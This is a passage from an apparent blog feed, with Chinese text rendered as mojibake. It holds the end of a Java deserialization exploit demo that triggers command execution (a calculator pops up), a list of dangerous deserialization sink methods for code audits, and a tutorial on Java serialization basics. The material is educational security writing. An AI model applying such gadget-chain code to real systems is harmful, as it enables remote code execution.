class="comment">//åˆ©ç”¨åå°„çš„æ–¹å¼æ¥å‘å¯¹è±¡ä¼ å‚</span></span><br><span class="line">        Field valfield = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(val, entry);</span><br><span class="line"></span><br><span class="line">        test t = <span class="keyword">new</span> test();</span><br><span class="line">        t.deserialize(t.serialize(val));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  Object <span class="title">deserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ByteArrayInputStream in = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼Œå¼¹å‡ºè®¡ç®—å™¨ï¼š</p><p><img src="/2019/02/06/Javaååºåˆ—åŒ–æ¼æ´/3.png" alt="demo3"></p><h2 id="æ£€æµ‹æ–¹æ³•"><a href="#æ£€æµ‹æ–¹æ³•" class="headerlink" title="æ£€æµ‹æ–¹æ³•"></a>æ£€æµ‹æ–¹æ³•</h2><p>å…¨å±€æœç´¢ObjectInputStreamç±»ï¼Œæ£€æŸ¥æ˜¯å¦è°ƒç”¨readObject()æ–¹æ³•ï¼Œè‹¥å­˜åœ¨è¯¥æ–¹æ³•åˆ™æ£€æŸ¥å…¶æ˜¯å¦è¿›è¡Œäº†é‡å†™ï¼Œè‹¥é‡å†™äº†readObject()æ–¹æ³•åˆ™éœ€ä¸¥æ ¼æ’æŸ¥æ˜¯å¦å¯æ„é€ åå°„é“¾æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><p>å½“ç„¶ï¼Œç»“åˆå…¶ä»–å‡ ä¸ªç±»å‹çš„Javaååºåˆ—æ¼æ´ï¼Œå…¨å±€æœç´¢çš„ç±»æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br></pre></td></tr></table></figure><h2 id="é˜²å¾¡æ–¹æ³•"><a href="#é˜²å¾¡æ–¹æ³•" class="headerlink" title="é˜²å¾¡æ–¹æ³•"></a>é˜²å¾¡æ–¹æ³•</h2><p>å¸¸è§çš„æ–¹æ³•ï¼Œå°±æ˜¯åœ¨ObjectInputStreamä¸­è®¾ç½®é»‘ç™½åå•æœºåˆ¶çš„æ–¹å¼è¿›è¡Œé˜²å¾¡ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.freebuf.com/vuls/170344.html" target="_blank" rel="noopener">Javaååºåˆ—åŒ–æ¼æ´çš„åŸç†åˆ†æ</a></p><p><a href="https://xz.aliyun.com/t/2041" target="_blank" rel="noopener">Javaååºåˆ—åŒ–æ¼æ´ä»å…¥é—¨åˆ°æ·±å…¥</a></p><p><a href="https://www.cnblogs.com/ssooking/p/5875215.html" target="_blank" rel="noopener">Javaååºåˆ—åŒ–æ¼æ´åˆ†æ</a></p><p><a href="https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md" target="_blank" rel="noopener">æµ…æJavaåºåˆ—åŒ–å’Œååºåˆ—åŒ–</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;åœ¨å­¦ä¹ Javaååºåˆ—åŒ–æ¼æ´ä¹‹å‰ï¼Œå»ºè®®å…ˆç†Ÿæ‚‰&lt;a href=&quot;https://mi1k7ea.github.io/2019/02/03/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5
      
    
    </summary>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶</title>
    <link href="https://Mi1k7ea.github.com/2019/02/03/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6/"/>
    <id>https://Mi1k7ea.github.com/2019/02/03/Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶/</id>
    <published>2019-02-03T12:12:02.000Z</published>
    <updated>2019-02-08T14:26:22.434Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™é‡Œä¸»è¦è®²è§£Javaåºåˆ—åŒ–åŠååºåˆ—åŒ–æœºåˆ¶ã€‚</p><h2 id="ä½•ä¸ºåºåˆ—åŒ–"><a href="#ä½•ä¸ºåºåˆ—åŒ–" class="headerlink" title="ä½•ä¸ºåºåˆ—åŒ–"></a>ä½•ä¸ºåºåˆ—åŒ–</h2><p>Java æä¾›äº†ä¸€ç§å¯¹è±¡åºåˆ—åŒ–çš„æœºåˆ¶ï¼šä¸€ä¸ªå¯¹è±¡å¯ä»¥è¢«è¡¨ç¤ºä¸ºä¸€ä¸ªå­—èŠ‚åºåˆ—ï¼Œè¯¥å­—èŠ‚åºåˆ—åŒ…æ‹¬è¯¥å¯¹è±¡çš„æ•°æ®ã€æœ‰å…³å¯¹è±¡çš„ç±»å‹çš„ä¿¡æ¯å’Œå­˜å‚¨åœ¨å¯¹è±¡ä¸­æ•°æ®çš„ç±»å‹ã€‚å°†åºåˆ—åŒ–å¯¹è±¡å†™å…¥æ–‡ä»¶ä¹‹åï¼Œå¯ä»¥ä»æ–‡ä»¶ä¸­è¯»å–å‡ºæ¥ï¼Œå¹¶ä¸”å¯¹å®ƒè¿›è¡Œååºåˆ—åŒ–ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹è±¡çš„ç±»å‹ä¿¡æ¯ã€å¯¹è±¡çš„æ•°æ®ï¼Œè¿˜æœ‰å¯¹è±¡ä¸­çš„æ•°æ®ç±»å‹å¯ä»¥ç”¨æ¥åœ¨å†…å­˜ä¸­æ–°å»ºå¯¹è±¡ã€‚æ•´ä¸ªè¿‡ç¨‹éƒ½æ˜¯JVMç‹¬ç«‹çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¸€ä¸ªå¹³å°ä¸Šåºåˆ—åŒ–çš„å¯¹è±¡å¯ä»¥åœ¨å¦ä¸€ä¸ªå®Œå…¨ä¸åŒçš„å¹³å°ä¸Šååºåˆ—åŒ–è¯¥å¯¹è±¡ã€‚</p><p>åºåˆ—åŒ–ï¼šæŠŠå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ã€‚</p><p>ååºåˆ—åŒ–ï¼šæŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºå¯¹è±¡çš„è¿‡ç¨‹ã€‚</p><h2 id="ä¸ºä½•è®¾è®¡åºåˆ—åŒ–"><a href="#ä¸ºä½•è®¾è®¡åºåˆ—åŒ–" class="headerlink" title="ä¸ºä½•è®¾è®¡åºåˆ—åŒ–"></a>ä¸ºä½•è®¾è®¡åºåˆ—åŒ–</h2><p>1ã€å¯ä»¥å¼¥è¡¥ä¸åŒæ“ä½œç³»ç»Ÿä¹‹é—´çš„å·®å¼‚ï¼Œå¦‚Windowsä¸Šåˆ›å»ºçš„å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–åé€šè¿‡ç½‘ç»œä¼ åˆ°Linuxä¸Šå¯ç›´æ¥ååºåˆ—åŒ–å¾—åˆ°è¯¥å¯¹è±¡è€Œæ— éœ€æ‹…å¿ƒæ•°æ®åœ¨ä¸åŒæœºå™¨ã€ç³»ç»Ÿä¸Šçš„è¡¨ç¤ºä¼šä¸åŒï¼›</p><p>2ã€å¯¹Javaçš„è¿œç¨‹æ–¹æ³•è°ƒç”¨RMIæ˜¯å¿…éœ€çš„ã€‚RMIæ˜¯ä¸ºäº†ä½¿å¾—å­˜åœ¨äºå…¶ä»–ä¸»æœºä¸Šçš„å¯¹è±¡ä½¿ç”¨èµ·æ¥åƒæœ¬æœºä¸Šçš„å¯¹è±¡ä¸€æ ·ï¼Œå½“å‘è¿œç¨‹å¯¹è±¡å‘é€ä¿¡æ¯æ—¶ï¼Œéœ€è¦é€šè¿‡å¯¹è±¡åºåˆ—åŒ–æ¥ä¼ è¾“å‚æ•°å’Œè¿”å›å€¼ï¼›</p><p>3ã€å¯¹Java Beanæ˜¯å¿…éœ€çš„ã€‚ä½¿ç”¨ä¸€ä¸ªBeanæ—¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯åœ¨è®¾è®¡é˜¶æ®µå¯¹å®ƒçš„çŠ¶æ€ä¿¡æ¯è¿›è¡Œé…ç½®ï¼Œç„¶è€Œè¿™ç§çŠ¶æ€ä¿¡æ¯éœ€è¦ä¿å­˜ä¸‹æ¥ï¼Œå¹¶åœ¨ç¨‹åºå¯åŠ¨æ—¶è¿›è¡ŒåæœŸæ¢å¤ï¼Œè¿™æ—¶æ˜¯é ååºåˆ—åŒ–æœºåˆ¶æ¥å®Œæˆçš„ï¼›</p><p>4ã€æ–¹ä¾¿ä¿å­˜å¯¹è±¡ä¿¡æ¯ä»¥ä¾¿äºä¸‹æ¬¡JVMå¯åŠ¨æ—¶å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚</p><h2 id="åºåˆ—åŒ–çš„æ¡ä»¶"><a href="#åºåˆ—åŒ–çš„æ¡ä»¶" class="headerlink" title="åºåˆ—åŒ–çš„æ¡ä»¶"></a>åºåˆ—åŒ–çš„æ¡ä»¶</h2><p>ä¸€ä¸ªç±»å¯¹è±¡è¦æƒ³å®ç°åºåˆ—åŒ–ï¼Œå¿…é¡»æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p><p>1ã€è¯¥ç±»å¿…é¡»å®ç° java.io.Serializable å¯¹è±¡ã€‚</p><p>2ã€è¯¥ç±»çš„æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ã€‚å¦‚æœæœ‰ä¸€ä¸ªå±æ€§ä¸æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œåˆ™è¯¥å±æ€§å¿…é¡»æ³¨æ˜æ˜¯çŸ­æš‚çš„ã€‚</p><h2 id="å¦‚ä½•åºåˆ—åŒ–"><a href="#å¦‚ä½•åºåˆ—åŒ–" class="headerlink" title="å¦‚ä½•åºåˆ—åŒ–"></a>å¦‚ä½•åºåˆ—åŒ–</h2><p>è¦åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œé¦–å…ˆè¦åˆ›å»ºOutputStreamå¯¹è±¡ï¼Œå†å°†å…¶å°è£…åœ¨ä¸€ä¸ªObjectOutputStreamå¯¹è±¡å†…ï¼Œæ¥ç€åªéœ€è°ƒç”¨writeObject()å³å¯å°†å¯¹è±¡åºåˆ—åŒ–ï¼Œå¹¶å°†å…¶å‘é€ç»™OutputStreamï¼ˆå¯¹è±¡æ˜¯åŸºäºå­—èŠ‚çš„ï¼Œå› æ­¤è¦ä½¿ç”¨InputStreamå’ŒOutputStreamæ¥ç»§æ‰¿å±‚æ¬¡ç»“æ„ï¼‰ã€‚</p><p>è¦ååºåˆ—åŒ–å‡ºä¸€ä¸ªå¯¹è±¡ï¼Œéœ€è¦å°†ä¸€ä¸ªInputStreamå°è£…åœ¨ObjectInputStreamå†…ï¼Œç„¶åè°ƒç”¨readObject()å³å¯ã€‚</p><p><strong>ObjectInputStream/ObjectOutputStreamç±»</strong></p><p>ç±» ObjectInputStream å’Œ ObjectOutputStream æ˜¯é«˜å±‚æ¬¡çš„æ•°æ®æµï¼Œå®ƒä»¬åŒ…å«ååºåˆ—åŒ–å’Œåºåˆ—åŒ–å¯¹è±¡çš„æ–¹æ³•ã€‚</p><p>ObjectOutputStream ç±»åŒ…å«å¾ˆå¤šå†™æ–¹æ³•æ¥å†™å„ç§æ•°æ®ç±»å‹ï¼Œä½†æ˜¯ä¸€ä¸ªç‰¹åˆ«çš„æ–¹æ³•ä¾‹å¤–å³writeObject()ï¼Œå…¶ç”¨æ¥åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†å®ƒå‘é€åˆ°è¾“å‡ºæµï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(Object x)</span> <span class="keyword">throws</span> IOException</span></span><br></pre></td></tr></table></figure><p>åŒæ ·çš„ï¼ŒObjectInputStreamç±»åŒ…å«ååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•readObject()ï¼Œå…¶ç”¨äºä»æµä¸­å–å‡ºä¸‹ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†å¯¹è±¡ååºåˆ—åŒ–ï¼Œå®ƒçš„è¿”å›å€¼ä¸ºObjectï¼Œå› æ­¤éœ€è¦å°†å®ƒè½¬æ¢æˆåˆé€‚çš„æ•°æ®ç±»å‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br></pre></td></tr></table></figure><p><strong>Demo</strong></p><p> å®šä¹‰ä¸€ä¸ªUserç±»ï¼Œç»§æ‰¿Serializableæ¥å£ï¼Œå…¶ä¸­addresså­—æ®µè®¾ç½®transientå…³é”®å­—ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">transient</span> String address;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> number;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Name: "</span> + name + <span class="string">"\nAddress: "</span> + address + <span class="string">"\nNumber: "</span> + number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–å†™ä¸€ä¸ªè¿›è¡Œåºåˆ—åŒ–æ“ä½œçš„ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.name = <span class="string">"Mi1k7ea"</span>;</span><br><span class="line">        user.address = <span class="string">"England"</span>;</span><br><span class="line">        user.number = <span class="number">666</span>;</span><br><span class="line">        user.info();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"user.ser"</span>);</span><br><span class="line">            ObjectOutputStream obs = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">            obs.writeObject(user);</span><br><span class="line">            obs.close();</span><br><span class="line">            fos.close();</span><br><span class="line">            System.out.println(<span class="string">"[*]Userå¯¹è±¡å·²ç»åºåˆ—åŒ–ä¿å­˜åˆ°user.seræ–‡ä»¶ä¸­"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        serialize_test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡ŒåæŸ¥çœ‹è¾“å‡ºï¼Œç»™è¯¥Userå¯¹è±¡èµ‹å€¼æˆåŠŸå¹¶ä¿å­˜åˆ°äº†ç›®æ ‡æ–‡ä»¶ä¸­ï¼š</p><p><img src="/2019/02/03/Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶/2.png" alt="åºåˆ—åŒ–demo"></p><p>ç”¨WinHexæ‰“å¼€user.seræ–‡ä»¶æŸ¥çœ‹ï¼š</p><p><img src="/2019/02/03/Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶/1.png" alt="åºåˆ—åŒ–demo"></p><p>åœ¨åˆšåˆšçš„test.classä¸­æ·»åŠ ååºåˆ—åŒ–æ“ä½œçš„å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.name = <span class="string">"Mi1k7ea"</span>;</span><br><span class="line">        user.address = <span class="string">"England"</span>;</span><br><span class="line">        user.number = <span class="number">666</span>;</span><br><span class="line">        user.info();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"user.ser"</span>);</span><br><span class="line">            ObjectOutputStream obs = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">            obs.writeObject(user);</span><br><span class="line">            obs.close();</span><br><span class="line">            fos.close();</span><br><span class="line">            System.out.println(<span class="string">"[*]Userå¯¹è±¡å·²ç»åºåˆ—åŒ–ä¿å­˜åˆ°user.seræ–‡ä»¶ä¸­"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unserialize_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"user.ser"</span>);</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">            user = (User)ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            fis.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"[*]ååºåˆ—åŒ–åçš„å†…å®¹ï¼š"</span>);</span><br><span class="line">        user.info();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        serialize_test();</span></span><br><span class="line">        unserialize_test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼ŒreadObject()æ–¹æ³•ä¸­çš„try/catchä»£ç å—å°è¯•æ•è· ClassNotFoundException å¼‚å¸¸ã€‚å¯¹äºJVMå¯ä»¥ååºåˆ—åŒ–å¯¹è±¡ï¼Œå®ƒå¿…é¡»æ˜¯èƒ½å¤Ÿæ‰¾åˆ°å­—èŠ‚ç çš„ç±»ã€‚å¦‚æœJVMåœ¨ååºåˆ—åŒ–å¯¹è±¡çš„è¿‡ç¨‹ä¸­æ‰¾ä¸åˆ°è¯¥ç±»ï¼Œåˆ™æŠ›å‡ºä¸€ä¸ªClassNotFoundExceptionå¼‚å¸¸ã€‚</p><p>æŸ¥çœ‹ååºåˆ—åŒ–ç»“æœï¼š</p><p><img src="/2019/02/03/Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶/3.png" alt="ååºåˆ—åŒ–demo"></p><p>å¯ä»¥çœ‹åˆ°ååºåˆ—åŒ–å‡ºæ¥çš„å¯¹è±¡ï¼Œé™¤äº†Addresså±æ€§å¤–å…¶ä½™çš„å±æ€§å€¼éƒ½æˆåŠŸåœ°ååºåˆ—åŒ–å‡ºæ¥äº†å¾—åˆ°å‡ ä¹å’Œåºåˆ—åŒ–ä¹‹å‰ä¸€æ ·çš„å¯¹è±¡ã€‚è¿™é‡ŒAddresså±æ€§æ˜¯å› ä¸ºè®¾ç½®äº†transientå…³é”®å­—ï¼Œå…·ä½“çš„åŸç†åœ¨ä¸‹é¢ä¼šè®²è§£ã€‚</p><h2 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="serialVersionUID"></a>serialVersionUID</h2><p>serialVersionUIDå³åºåˆ—åŒ–çš„ç‰ˆæœ¬å·ï¼Œé€‚ç”¨äºJavaçš„åºåˆ—åŒ–æœºåˆ¶ã€‚ç®€å•æ¥è¯´ï¼ŒJavaçš„åºåˆ—åŒ–æœºåˆ¶æ˜¯é€šè¿‡åˆ¤æ–­ç±»çš„serialVersionUIDæ¥éªŒè¯ç‰ˆæœ¬ä¸€è‡´æ€§çš„ã€‚åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼ŒJVMä¼šæŠŠä¼ æ¥çš„å­—èŠ‚æµä¸­çš„serialVersionUIDä¸æœ¬åœ°ç›¸åº”å®ä½“ç±»çš„serialVersionUIDè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸åŒå°±è®¤ä¸ºæ˜¯ä¸€è‡´çš„ï¼Œå¯ä»¥è¿›è¡Œååºåˆ—åŒ–ï¼Œå¦åˆ™å°±ä¼šå‡ºç°åºåˆ—åŒ–ç‰ˆæœ¬ä¸ä¸€è‡´çš„å¼‚å¸¸ï¼Œå³æ˜¯InvalidCastExceptionã€‚</p><p><strong>å…·ä½“çš„åºåˆ—åŒ–è¿‡ç¨‹æ˜¯è¿™æ ·çš„</strong>ï¼šåºåˆ—åŒ–æ“ä½œçš„æ—¶å€™ç³»ç»Ÿä¼šæŠŠå½“å‰ç±»çš„serialVersionUIDå†™å…¥åˆ°åºåˆ—åŒ–æ–‡ä»¶ä¸­ï¼Œå½“ååºåˆ—åŒ–æ—¶ç³»ç»Ÿä¼šå»æ£€æµ‹æ–‡ä»¶ä¸­çš„serialVersionUIDï¼Œåˆ¤æ–­å®ƒæ˜¯å¦ä¸å½“å‰ç±»çš„serialVersionUIDä¸€è‡´ï¼Œå¦‚æœä¸€è‡´å°±è¯´æ˜åºåˆ—åŒ–ç±»çš„ç‰ˆæœ¬ä¸å½“å‰ç±»ç‰ˆæœ¬æ˜¯ä¸€æ ·çš„ï¼Œå¯ä»¥ååºåˆ—åŒ–æˆåŠŸï¼Œå¦åˆ™å¤±è´¥ã€‚</p><p><strong>serialVersionUIDæœ‰ä¸¤ç§æ˜¾ç¤ºçš„ç”Ÿæˆæ–¹å¼ï¼š</strong></p><p>ä¸€æ˜¯é»˜è®¤çš„1Lï¼Œæ¯”å¦‚ï¼šprivate static final long serialVersionUID = 1Lï¼›</p><p>äºŒæ˜¯æ ¹æ®ç±»åã€æ¥å£åã€æˆå‘˜æ–¹æ³•åŠå±æ€§ç­‰æ¥ç”Ÿæˆä¸€ä¸ª64ä½çš„å“ˆå¸Œå­—æ®µï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = xxxxL;</span><br></pre></td></tr></table></figure><p>å½“ä¸€ä¸ªç±»å®ç°äº†Serializableæ¥å£ï¼Œå¦‚æœæ²¡æœ‰æ˜¾ç¤ºçš„å®šä¹‰serialVersionUIDï¼ŒEclipseä¼šæä¾›ç›¸åº”çš„æé†’ã€‚é¢å¯¹è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨Eclipseä¸­ç‚¹å‡»ç±»ä¸­warningå›¾æ ‡ä¸€ä¸‹ï¼ŒEclipseå°±ä¼šè‡ªåŠ¨ç»™å®šä¸¤ç§ç”Ÿæˆçš„æ–¹å¼ã€‚å¦‚æœä¸æƒ³å®šä¹‰ï¼Œåœ¨Eclipseçš„è®¾ç½®ä¸­ä¹Ÿå¯ä»¥æŠŠå®ƒå…³æ‰çš„ï¼Œè®¾ç½®å¦‚ä¸‹ï¼š</p><p>Window ==&gt; Preferences ==&gt; Java ==&gt; Compiler ==&gt; Error/Warnings ==&gt; Potential programming problems<br>å°†Serializable class without serialVersionUIDçš„warningæ”¹æˆignoreå³å¯ã€‚</p><p>å½“å®ç°java.io.Serializableæ¥å£çš„ç±»æ²¡æœ‰æ˜¾å¼åœ°å®šä¹‰ä¸€ä¸ªserialVersionUIDå˜é‡æ—¶å€™ï¼ŒJavaåºåˆ—åŒ–æœºåˆ¶ä¼šæ ¹æ®ç¼–è¯‘çš„Classè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªserialVersionUIDä½œåºåˆ—åŒ–ç‰ˆæœ¬æ¯”è¾ƒç”¨ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœClassæ–‡ä»¶(ç±»åï¼Œæ–¹æ³•æ˜ç­‰)æ²¡æœ‰å‘ç”Ÿå˜åŒ–(å¢åŠ ç©ºæ ¼ï¼Œæ¢è¡Œï¼Œå¢åŠ 